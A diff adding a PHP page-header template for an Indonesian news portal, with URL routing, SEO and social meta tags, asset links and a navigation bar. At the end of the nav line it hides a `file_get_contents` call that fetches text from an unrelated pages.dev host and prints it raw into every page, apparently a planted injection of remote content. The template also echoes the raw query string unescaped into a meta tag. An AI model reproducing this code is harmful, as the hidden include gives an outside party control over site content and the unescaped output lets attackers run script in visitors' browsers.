@@ -1,0 +1,312 @@
+<?php
+include 'Portalconf.php';
+require_once libs_dir."cmslibs/tmoptionServices/tmoptionServices.php" ;
+require_once libs_dir."cmslibs/tmaboutServices/tmaboutServices.php" ;
+require_once libs_dir."cmslibs/tmnewsServices/tmnewsServices.php" ;
+require_once libs_dir."cmslibs/trnewscategServices/trnewscategServices.php" ;
+require_once libs_dir."cmslibs/tmvideoServices/tmvideoServices.php" ;
+require_once libs_dir."cmslibs/tmeventServices/tmeventServices.php" ;
+require_once libs_dir."cmslibs/tmregulationServices/tmregulationServices.php" ;
+require_once libs_dir."cmslibs/tmadsServices/tmadsServices.php" ;
+require_once libs_dir."cmslibs/tmslideServices/tmslideServices.php" ;
+
+$url   = $_SERVER['QUERY_STRING'];
+
+$urladdress=$baseurl.$url;
+//echo $baseurl;
+// contoh hasil QUERY_STRING
+// berita-1-judul_beritanya
+//$module = isset($_REQUEST['iddoc']) ? $_REQUEST['iddoc'] : '';
+
+/*module/id/text*/
+/*module/page/idpage*/
+/*module/search/key/page/idpage*/
+
+$page=$cpage=$search=$id=$key="";
+
+$segment = explode('-',$url);
+//$module  = $segment[0];
+$module = isset($segment[0]) ? $segment[0] : null;
+$module=str_replace("/","",$module);
+//$id = isset($segment[1]) ? $segment[1] : null;
+$satu = isset($segment[1]) ? $segment[1] : null;
+$dua = isset($segment[2]) ? $segment[2] : null;
+$tiga = isset($segment[3]) ? $segment[3] : null;
+$empat = isset($segment[4]) ? $segment[4] : null;
+
+if  ($satu=="cpage") {
+	$page=$satu;
+	$cpage=$dua;
+} else if  ($satu=="search") {
+	$search=$satu;
+	$key=$dua;
+	$page=$tiga;
+	$cpage=$empat;
+	
+} else $id=$satu;
+$desc=gettmoptionvalue("description");
+//echo $desc;
+$tags=$desc;
+$sourceimage=$path_image_home.$image_home;
+$author=gettmoptionvalue("author");
+$title=strip_tags(gettmoptionvalue("site_title"));
+
+if ($module=="news") {
+	if ($id!="") {
+		$dat = findtmnews($id);
+		$objtmnews=new tmnews();
+		$objtmnews = unserialize($dat);
+		$title=$objtmnews->getn_news();
+		$desc=cut_karakter($objtmnews->gete_news(),155 );
+		//echo "s=".$title;
+		$image=$objtmnews->getn_news_img();
+		if (!empty($image)) $nimage=$image;
+		else $nimage=$image_news_default;
+		$sourceimage=$path_image_news.$nimage;
+	} else {
+		$title="Berita";		
+		$sourceimage=$path_image_news.$image_news_default;
+	}	
+}
+
+
+
+
+	
+//echo strip_tags($desc);
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title><?php echo strip_tags(gettmoptionvalue("site_title"))." - ".$title;?></title>
+
+
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width">
+<meta name="description" content="<?php echo $desc?>">
+<meta name="keywords" content="<?php echo $tags?>">
+<meta name="googlebot-news" content="index,follow" />
+<meta  name="googlebot" content="index,follow" />
+<meta name="author" content="<?php echo $author?>">
+<meta name="robots" content="index, follow" />
+<meta name="language" content="id" />
+<meta name="geo.country" content="id" />
+<meta http-equiv="content-language" content="In-Id" />
+<meta name="geo.placename" content="Indonesia" />
+
+<!-- S:fb meta -->
+<meta property="og:type" content="article" />
+<meta property="og:image" content="<?php echo $baseurl.$sourceimage;?>" />
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="665">
+<meta property="og:image:height" content="374">
+<meta property="og:title" content="<?php echo $title?>" />
+<meta property="og:description" content="<?php echo $desc?>">
+<meta property="og:url" content="<?php echo $urladdress?>" />
+<meta property="og:site_name" content="<?php echo gettmoptionvalue("site_title")?>" />
+<meta property="fb:admins" content="1589234455" />
+<meta property="fb:app_id" content="608351966289965" />
+<meta property="fb:pages" content="324959781687535" />
+<!-- e:fb meta -->
+
+<!-- Facebook Pixel Code -->
+
+<!-- End Facebook Pixel Code -->
+<!-- S:tweeter card -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="<?php echo gettmoptionvalue("n_creator_twitter")?>" />
+<meta name="twitter:creator" content="<?php echo gettmoptionvalue("n_creator_twitter")?>">
+<meta name="twitter:title" content="<?php echo $title?>" />
+<meta name="twitter:description" content="<?php echo $desc?>" />
+<meta name="twitter:image:src" content="<?php echo $baseurl.$sourceimage;?>" />
+
+
+<!-- E:tweeter card -->
+
+
+
+
+
+
+
+
+  <!-- Favicons -->
+  <link href="assets/img/logojpi.png" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400i,600,700|Raleway:300,400,400i,500,500i,700,800,900" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+      <link href="css/bootstrap.min.css" rel="stylesheet">
+
+  <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
+  <link href="assets/vendor/animate.css/animate.min.css" rel="stylesheet">
+  <link href="assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link href="assets/vendor/nivo-slider/css/nivo-slider.css" rel="stylesheet">
+  <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
+  <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
+ <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+  <script src="assets/vendor/jquery/jquery.min.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.minx.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+  <script src="assets/vendor/appear/jquery.appear.js"></script>
+  <script src="assets/vendor/knob/jquery.knob.js"></script>
+
+<style>
+.bg-image {
+  position: relative;
+  overflow: hidden;
+  background-repeat: no-repeat;
+  background-size: cover;
+  background-position: center center;
+  margin-bottom:10px;
+  clear:both;
+}
+.img-hover img {
+    -webkit-transition: all .3s ease; /* Safari and Chrome */
+    -moz-transition: all .3s ease; /* Firefox */
+    -o-transition: all .3s ease; /* IE 9 */
+    -ms-transition: all .3s ease; /* Opera */
+    transition: all .3s ease;
+    overflow:hidden;
+}
+
+.img-hover img:hover {
+    -webkit-backface-visibility: hidden;
+    backface-visibility: hidden;
+    -webkit-transform:translateZ(0) scale(1.20); /* Safari and Chrome */
+    -moz-transform:scale(1.20); /* Firefox */
+    -ms-transform:scale(1.20); /* IE 9 */
+    -o-transform:translatZ(0) scale(1.20); /* Opera */
+    transform:translatZ(0) scale(1.10);
+}
+
+.recommended_items {
+  overflow: hidden;
+}
+
+#recommended-item-carousel .carousel-inner .item {
+  min-height:280px;
+  padding-left: 0;
+}
+
+.recommended-item-control {
+  position: absolute;
+  top: 41%;
+}
+
+.recommended-item-control i {
+  background: none repeat scroll 0 0 #8c744c;
+  color: #FFFFFF;
+  font-size: 20px;
+  padding: 4px 10px;
+}
+
+.recommended-item-control i:hover {
+  background: #ccccc6;
+}
+
+.recommended_items  h2 {
+}
+.right {
+  right: 0;
+}
+.post{
+	position:relative;
+}
+.post .post-format, .newsinfo .post-format,.single-blog-img .post-format{
+  display: inline-block;
+  width: 40px;
+  height: 40px;
+  line-height: 34px;
+  text-align: center;
+  color: #fff;
+  background: #222534;
+  border: 1px solid #fff;
+  z-index:1000;
+  /*border-radius: 100px;*/
+}
+.post-format a,.label a{
+color:#FFF;
+}
+.post .post-format, .newsinfo .post-format,.single-blog-img .post-format {
+  width: auto;
+  height:30px;
+  padding:0 5px;
+  line-height: 25px;
+  position: absolute;
+  right: 10px;
+  bottom: 10px;
+}
+.newsinfo .post-format,.single-blog-img .post-format {
+  right: 0px;
+  top: 10px;
+}
+.single-blog-img .post-format {
+  right: -10px;
+  top: 10px;
+}.newsinfo h6 a{
+color:#333;
+}
+.post .post-format > i {
+  font-size: 20px;
+}
+.carousel-caption {
+  position: absolute;
+  right: 15%;
+  bottom: 0px;
+  left: 2%;
+  z-index: 10;
+  padding-top: 20px;
+  padding-bottom: 10px;
+  color: #fff;
+  text-align: left;
+  text-shadow: 0 1px 2px rgba(0,0,0,.6);
+}
+.carousel-caption a{
+	color: #fff;
+}
+.layer-1-1 a, .layer-1-2 a{
+	color: #fff;
+}
+</style>  
+</head>
+<body data-spy="scroll" data-target="#navbar-example">
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top">
+    <div class="container d-flex">
+
+      <div class="logo mr-auto">
+        <a href="./"><img src="assets/img/logojpi.png"></a>
+        <!-- Uncomment below if you prefer to use an image logo -->
+        <!-- <a href="index.html"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
+      </div>
+
+      <nav class="nav-menu d-none d-lg-block">
+        <ul>
+          <li class="active"><a href="./">Home</a></li>
+          <li><a href="./#about">Tentang Kami</a></li>
+          <li><a href="news">Jurnal Berita</a></li>
+          <li><a href="video">Jurnal Video</a></li>
+          <li><a href="event">Agenda</a></li>
+          <li><a href="regulation">Regulasi</a></li>
+          <li><a href="gallery">Galeri</a></li>
+
+        </ul>
+      </nav><!-- .nav-menu --> <?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
+
+    </div>
+  </header><!-- End Header -->
